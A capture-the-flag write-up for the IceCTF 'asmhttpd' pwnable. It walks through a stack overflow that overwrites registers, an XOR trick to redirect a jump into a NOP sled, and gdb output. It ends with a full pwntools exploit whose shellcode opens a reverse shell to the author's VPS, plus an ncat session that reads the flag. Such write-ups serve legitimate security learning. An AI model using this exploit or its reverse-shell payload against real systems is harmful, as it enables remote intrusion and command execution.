### Solved by superkojiman

This one pwnable is a webserver called asmhttpd, and carries the most points for all the pwnables. The binary has no NX or canary, and we're informed that the server it's running on has ASLR disabled. I actually found the source code for this on [GitHub](https://github.com/nemasu/asmttpd), but I believe this was modified to make it vulnerable.

I found that by passing 9000 bytes, I could actually overwrite r13 at offset 1000, which was used in the following instructions:

```
   0x40103c <worker_thread_continue+44>:        call   0x400de4 <hmac>
   0x401041 <worker_thread_continue+49>:        xor    r13,rax
   0x401044 <worker_thread_continue+52>:        jmp    r13
```

That seemed promising! One problem though was that it kept crashing at the hmacxorloop() called in hmac() because of this:

```
=> 0x400e07 <hmacxorloop>:      xor    rbx,QWORD PTR [r12+rax*1]
```

r12 was at offset 1016 and was being overwritten with my junk payload, so I set this to a valid address. Since ASLR was disabled, I picked 0x00007ffff7fd2000, which is the start of the thread's stack:

```
gdb-peda$ vmmap
Start              End                Perm      Name
0x00400000         0x00402000         r-xp      /root/work/asmttpd_9f3927f2efa1978b45211a93afc9920bd03c425e90abcda268be41d96e6862fa
0x00601000         0x00602000         rwxp      /root/work/asmttpd_9f3927f2efa1978b45211a93afc9920bd03c425e90abcda268be41d96e6862fa
0x00007ffff7fd2000 0x00007ffff7ffb000 rwxp      [stack:17206]
0x00007ffff7ffb000 0x00007ffff7ffd000 r--p      [vvar]
0x00007ffff7ffd000 0x00007ffff7fff000 r-xp      [vdso]
0x00007ffffffde000 0x00007ffffffff000 rwxp      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp      [vsyscall]
```

This satisfied hmacxorloop()'s xor instruction, and by the time the hmac() function returned, I could now deal with the following:

```
   0x40103c <worker_thread_continue+44>:        call   0x400de4 <hmac>
=> 0x401041 <worker_thread_continue+49>:        xor    r13,rax
   0x401044 <worker_thread_continue+52>:        jmp    r13
```

The problem here was that r13 would get xor'd with whatever was in rax. In this case, rax was set to 0xa7a9904289ef6381:

```
gdb-peda$ p $rax
$1 = 0xa7a9904289ef6381
```

Therefore r13 xor 0xa7a9904289ef6381 should return the location of my payload. In this case, my payload of 9000 NOPs was located in the thread's stack:

```
gdb-peda$ find 0x9090909090
Searching for '0x9090909090' in: None ranges
Found 182 results, display max 182 items:
[stack:17206] : 0x7ffff7ff6bf8 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6bfd --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c02 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c07 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c0c --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c11 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c16 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c1b --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c20 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c25 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c2a --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c2f --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c34 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c39 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c3e --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c43 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c48 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c4d --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c52 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c57 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c5c --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c61 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c66 --> 0x9090909090909090
[stack:17206] : 0x7ffff7ff6c6b --> 0x9090909090909090
--More--(25/183)
```

I picked 0x7ffff7ff6c08 to jump to. Due to xor's property: 

```
0x7ffff7ff6c08 ^ 0xa7a9904289ef6381 = 0xa7a9efbd7e100f89
```

therefore

```
0xa7a9904289ef6381 ^ 0xa7a9efbd7e100f89 = 0x7ffff7ff6c08
```

So by setting r13 to 0xa7a9efbd7e100f89, it would become 0x7ffff7ff6c08 after it was xor'd with rax. After that, the jmp r13 would go straight to my payload and execute it. 

```
 [----------------------------------registers-----------------------------------]
RAX: 0xa7a9904289ef6381
RBX: 0x0
RCX: 0x400c6c (<sys_clone+46>:  cmp    rax,0x0)
RDX: 0x2000 ('')
RSI: 0x7ffff7ff6bf8 --> 0x9090909090909090
RDI: 0x7ffff7fd2000 --> 0x0
RBP: 0x7ffff7ff7000 ("caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaac"...)
RSP: 0x7ffff7ff6bf0 --> 0x2000 ('')
RIP: 0x7ffff7ff6c08 --> 0x9090909090909090
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x246
R12: 0x7ffff7fd2000 --> 0x0
R13: 0x7ffff7ff6c08 --> 0x9090909090909090
R14: 0x400fda (<worker_thread>: mov    rbp,rsp)
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7ff6c05:      nop
   0x7ffff7ff6c06:      nop
   0x7ffff7ff6c07:      nop
=> 0x7ffff7ff6c08:      nop
   0x7ffff7ff6c09:      nop
   0x7ffff7ff6c0a:      nop
   0x7ffff7ff6c0b:      nop
   0x7ffff7ff6c0c:      nop
[------------------------------------stack-------------------------------------]
0000| 0x7ffff7ff6bf0 --> 0x2000 ('')
0008| 0x7ffff7ff6bf8 --> 0x9090909090909090
0016| 0x7ffff7ff6c00 --> 0x9090909090909090
0024| 0x7ffff7ff6c08 --> 0x9090909090909090
0032| 0x7ffff7ff6c10 --> 0x9090909090909090
0040| 0x7ffff7ff6c18 --> 0x9090909090909090
0048| 0x7ffff7ff6c20 --> 0x9090909090909090
0056| 0x7ffff7ff6c28 --> 0x9090909090909090
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00007ffff7ff6c08 in ?? ()
gdb-peda$
```

Here's the final exploit:

```
#!/usr/bin/env python

from pwn import *
context(arch="amd64", os="linux")

r = remote("slick.vuln.icec.tf", 6600)

buf = ""

# shellcode stored around 0x7ffff7ff6c08
buf += "\x90"*900                   # junk
buf += asm(shellcraft.linux.connect("my.vps.ip.addr", 9999))    # connect to vps
buf += asm(shellcraft.linux.dupsh())                            # reverse shell
buf += "\xcc"*(1000-len(buf))       # junk

buf += p64(0xa7a9efbd7e100f89)      # turns to 0x7ffff7ff6c08 after rax ^ r13
buf += "a"*8                        # junk
buf += p64(0x00007ffff7fd2000)      # set r12 in hmacxorloop()
buf += cyclic( 9000-len(buf) )      # junk
buf += "\r\n\r\n"

r.send(buf)
```

The exploit establishes a reverse shell to my VPS. One thing I found was that the exploit would work maybe 1 out of 5 tries. I'm not sure why, but the odds weren't too bad so I stuck with it. 

Using two terminals, I setup a necat listener on my VPS to wait for connections on port 9999. Then I ran my exploit:

```
$ ./reverse.py
[+] Opening connection to slick.vuln.icec.tf on port 6600: Done
[*] Closed connection to slick.vuln.icec.tf port 6600
```

On my VPS, I got the connection:

```
koji@vps:~$ ncat -lvp 9999
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 104.154.248.13.
Ncat: Connection from 104.154.248.13:46930.
id
uid=998(ctf) gid=998(ctf) groups=998(ctf)
uname -a
Linux 282e4fc6a2c0 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2+deb8u3 (2016-07-02) x86_64 GNU/Linux
ls
asmttpd
flag.txt
web_root
cat flag.txt
IceCTF{r0p+z3-FTW}
```

This was actually quite easy, no ROP required. I suspect I may have solved it in an unintended way. 
